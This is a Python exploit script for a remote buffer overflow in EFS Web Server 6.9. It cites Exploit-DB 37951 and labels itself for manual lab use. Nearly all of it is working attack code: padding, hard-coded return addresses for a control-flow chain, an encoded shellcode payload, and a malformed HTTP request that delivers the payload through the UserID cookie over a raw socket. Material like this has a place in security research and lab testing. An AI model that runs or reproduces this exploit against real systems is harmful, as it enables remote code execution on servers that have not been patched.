#!/usr/bin/env python3
# Reference: Exploit-DB 37951 — EFS Web Server 6.9 USERID remote buffer overflow
# https://www.exploit-db.com/exploits/37951
# Maintainer validation: scripts/validate/check_efs69_response.py
# Manual use only. Set host/port before running against a lab VM.

from struct import pack
import socket
import sys

host = "127.0.0.1"
port = 80

junk0 = "\x90" * 80

call_edx = pack("<L", 0x1001D8C8)

junk1 = "\x90" * 396
ppr = pack("<L", 0x10010101)

crafted_jmp_esp = pack("<L", 0xA4523C15)

test_bl = pack("<L", 0x10010125)

kungfu = pack("<L", 0x10022AAC)
kungfu += pack("<L", 0xDEADBEEF)
kungfu += pack("<L", 0xDEADBEEF)
kungfu += pack("<L", 0x1001A187)
kungfu += pack("<L", 0x1002466D)

nopsled = "\x90" * 20

shellcode = (
    "\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9"
    "\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab"
    "\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71"
    "\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09"
    "\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c"
    "\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e"
    "\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78"
    "\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22"
    "\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f"
    "\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28"
    "\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50"
    "\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4"
    "\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56"
    "\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56"
    "\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16"
    "\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea"
    "\xa5\x59\x50"
)

payload = junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + shellcode

buf = "GET /vfolder.ghp HTTP/1.1\r\n"
buf += "User-Agent: Mozilla/4.0\r\n"
buf += f"Host:{host}:{port}\r\n"
buf += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf += "Accept-Language: en-us\r\n"
buf += "Accept-Encoding: gzip, deflate\r\n"
buf += f"Referer: http://{host}/\r\n"
buf += f"Cookie: SESSIONID=1337; UserID={payload}; PassWD=;\r\n"
buf += "Conection: Keep-Alive\r\n\r\n"

print(f"[*] Connecting to {host}:{port}...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host, port))
    print(f"[*] Connected to {host}")
except OSError:
    print(f"[!] {host} did not respond")
    sys.exit(1)

print("[*] Sending malformed request...")
s.send(buf.encode("latin-1"))
print("[!] Exploit sent")
s.close()
